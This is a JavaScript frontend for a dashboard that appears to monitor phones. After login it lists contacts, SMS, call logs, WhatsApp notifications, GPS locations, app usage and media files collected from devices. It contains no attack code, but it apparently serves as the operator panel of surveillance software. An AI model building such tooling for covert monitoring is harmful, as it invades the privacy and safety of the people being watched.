// main.js - frontend dashboard
const api = {
  post: async (path, body, token) => {
    try {
      const res = await fetch(path, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
        body: JSON.stringify(body)
      });
      return await res.json();
    } catch (e) {
      console.error('POST error', path, e);
      return null;
    }
  },
  get: async (path, token) => {
    try {
      const res = await fetch(path, {
        headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
      });
      if (!res.ok) return [];
      return await res.json();
    } catch (e) {
      console.error('GET error', path, e);
      return [];
    }
  },
  getWithQuery: async (path, params, token) => {
    try {
      const qs = new URLSearchParams(params || {}).toString();
      return await api.get(path + (qs ? ('?' + qs) : ''), token);
    } catch (e) {
      console.error('getWithQuery error', e);
      return [];
    }
  }
};

const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  document.getElementById('btnLogout').classList.remove('hidden');
  document.getElementById('userName').innerText = user ? user.username : '';
}

function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}

function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await api.post('/api/auth/login', { username: u, password: p });
  if (r && r.token) {
    setLoggedIn(r.user, r.token);
    startAutoRefresh();
  } else {
    document.getElementById('loginMsg').innerText = (r && r.error) ? r.error : 'Falha no login';
  }
});

document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await api.post('/api/auth/register', { username: u, password: p });
  if (r && r.ok) {
    document.getElementById('loginMsg').innerText = 'Registado com sucesso — faça login';
  } else {
    document.getElementById('loginMsg').innerText = (r && r.error) ? r.error : 'Erro no registo';
  }
});

document.getElementById('btnLogout').addEventListener('click', logout);

document.getElementById('btnSearchContacts').addEventListener('click', () => {
  contactsPage = 1;
  renderContacts();
});

// --- rendering functions ---
let contactsPage = 1;
const CONTACTS_PAGE_SIZE = 200;

async function renderContacts() {
  const token = getToken();
  if (!token) return;
  const q = document.getElementById('contactsQuery').value.trim();
  // backend supports 'q' and deviceId optional; we request large limit via server-side limit
  const params = { q: q || undefined, limit: CONTACTS_PAGE_SIZE, skip: (contactsPage-1)*CONTACTS_PAGE_SIZE };
  const contacts = await api.getWithQuery('/api/contacts', params, token) || [];
  const list = document.getElementById('contactsList');
  list.innerHTML = '';
  if (!contacts || contacts.length === 0) {
    list.innerHTML = '<li>Nenhum contacto encontrado</li>';
    return;
  }
  contacts.forEach(c => {
    const li = document.createElement('li');
    li.innerHTML = `<strong>${escapeHtml(c.name||'(sem nome)')}</strong> — ${escapeHtml(c.number||'')} <span class="meta">[device: ${escapeHtml(c.deviceId||'')}]</span>`;
    list.appendChild(li);
  });
  document.getElementById('contactsPage').innerText = contactsPage;
}

async function renderSms() {
  const token = getToken();
  if (!token) return;
  const sms = await api.get('/api/sms', token) || [];
  const smsList = document.getElementById('smsList'); smsList.innerHTML = '';
  if (!sms.length) { smsList.innerHTML = '<li>Nenhum SMS</li>'; return; }
  sms.forEach(s => {
    const li = document.createElement('li');
    li.textContent = `${s.sender || '(unknown)'}: ${s.message || ''} `;
    const meta = document.createElement('span'); meta.className = 'meta';
    meta.textContent = `(${new Date(s.timestamp || Date.now()).toLocaleString()})`;
    li.appendChild(meta);
    smsList.appendChild(li);
  });
}

async function renderCalls() {
  const token = getToken();
  if (!token) return;
  const calls = await api.get('/api/call', token) || [];
  const callsList = document.getElementById('callsList'); callsList.innerHTML = '';
  if (!calls.length) { callsList.innerHTML = '<li>Nenhuma chamada</li>'; return; }
  calls.forEach(c => {
    const li = document.createElement('li');
    const number = c.number || '(unknown)';
    const duration = c.duration ? `${Math.round((c.duration||0)/1000)}s` : '-';
    li.textContent = `${number} — ${c.state||c.type||''} — ${duration} `;
    const meta = document.createElement('span'); meta.className = 'meta';
    meta.textContent = `${new Date(c.timestamp || Date.now()).toLocaleString()}`;
    li.appendChild(meta);
    callsList.appendChild(li);
  });
}

async function renderNotifs() {
  const token = getToken();
  if (!token) return;
  const notifs = await api.get('/api/whatsapp', token) || [];
  const notifList = document.getElementById('notifList'); notifList.innerHTML = '';
  if (!notifs.length) { notifList.innerHTML = '<li>Nenhuma notificação</li>'; return; }
  notifs.forEach(n => {
    const li = document.createElement('li');
    li.textContent = `${n.packageName || ''}: ${n.message || ''} `;
    const meta = document.createElement('span'); meta.className = 'meta';
    meta.textContent = `(${new Date(n.timestamp || Date.now()).toLocaleString()})`;
    li.appendChild(meta);
    notifList.appendChild(li);
  });
}

async function renderLocs() {
  const token = getToken();
  if (!token) return;
  const locs = await api.get('/api/location', token) || [];
  const locList = document.getElementById('locList'); locList.innerHTML = '';
  if (!locs.length) { locList.innerHTML = '<li>Nenhuma localização</li>'; return; }
  locs.forEach(l => {
    const li = document.createElement('li');
    const lat = (typeof l.lat === 'number') ? l.lat.toFixed(5) : l.lat;
    const lon = (typeof l.lon === 'number') ? l.lon.toFixed(5) : l.lon;
    li.textContent = `${lat}, ${lon} (${l.accuracy||'?'}) `;
    const meta = document.createElement('span'); meta.className = 'meta';
    meta.textContent = `${new Date(l.timestamp || Date.now()).toLocaleString()} [device:${escapeHtml(l.deviceId||'')}]`;
    li.appendChild(meta);
    locList.appendChild(li);
  });
}

async function renderUsage() {
  const token = getToken();
  if (!token) return;
  const usage = await api.get('/api/app-usage', token) || [];
  const usageList = document.getElementById('usageList'); usageList.innerHTML = '';
  if (!usage.length) { usageList.innerHTML = '<li>Nenhum uso registado</li>'; return; }
  usage.forEach(u => {
    const li = document.createElement('li');
    li.textContent = `${u.packageName || ''}: ${u.totalTime || 0}ms `;
    const meta = document.createElement('span'); meta.className = 'meta';
    meta.textContent = `(last: ${new Date(u.lastTimeUsed || Date.now()).toLocaleString()})`;
    li.appendChild(meta);
    usageList.appendChild(li);
  });
}

async function renderMedia() {
  const token = getToken();
  if (!token) return;
  const media = await api.get('/api/media', token) || [];
  const mediaList = document.getElementById('mediaList'); mediaList.innerHTML = '';
  if (!media.length) { mediaList.innerHTML = '<li>Nenhum ficheiro</li>'; return; }
  media.forEach(m => {
    const li = document.createElement('li');
    const name = m.filename || m._id || 'file';
    const span = document.createElement('span'); span.textContent = name + ' ';
    li.appendChild(span);

    const btn = document.createElement('button');
    btn.textContent = 'Download';
    btn.className = 'small';
    btn.addEventListener('click', async () => {
      try {
        const res = await fetch('/api/media/' + m._id, { headers: { Authorization: 'Bearer ' + token } });
        if (!res.ok) return alert('Download failed');
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = name;
        document.body.appendChild(a); a.click();
        a.remove(); URL.revokeObjectURL(url);
      } catch (e) {
        console.error('download error', e); alert('Erro no download');
      }
    });
    li.appendChild(btn);
    mediaList.appendChild(li);
  });
}

// --- orchestration ---
async function renderAll() {
  await Promise.all([
    renderContacts(),
    renderSms(),
    renderCalls(),
    renderNotifs(),
    renderLocs(),
    renderUsage(),
    renderMedia()
  ]);
}

function startAutoRefresh() {
  renderAll();
  // refresh every 6s
  if (window.__monitorInterval) clearInterval(window.__monitorInterval);
  window.__monitorInterval = setInterval(renderAll, 6000);
}

// helper
function escapeHtml(s) {
  if (!s) return '';
  return s.toString().replace(/[&<>"']/g, (m) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

// on load: if token exists, show dashboard; else show login
window.addEventListener('load', () => {
  const token = getToken();
  if (token) {
    const user = getUser();
    document.getElementById('loginBox').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    document.getElementById('btnLogout').classList.remove('hidden');
    document.getElementById('userName').innerText = user ? user.username : '';
    startAutoRefresh();
  }
});
